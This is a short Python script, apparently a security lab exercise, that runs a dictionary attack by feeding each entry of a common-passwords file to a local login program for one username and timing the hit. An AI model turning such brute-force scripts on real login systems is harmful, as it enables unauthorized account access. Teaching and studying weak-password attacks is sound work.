import subprocess
from time import time
import sys

start = time()

login = "/home/cse/Lab1/Q1/Login.pyc"

with open("/home/cse/Lab1/Q1/MostCommonPWs", "r") as f:
    passwords = f.read().splitlines()

for line in passwords:
    line = line.strip()
    answer = subprocess.run(["python3", login, "SkyRedFalcon914", line], text = True, capture_output = True)
    if ("Login successful.\n" == answer.stdout):
        print(line)
        print(time() - start)
        sys.exit(0)

print("Password not found.")
sys.exit(1)
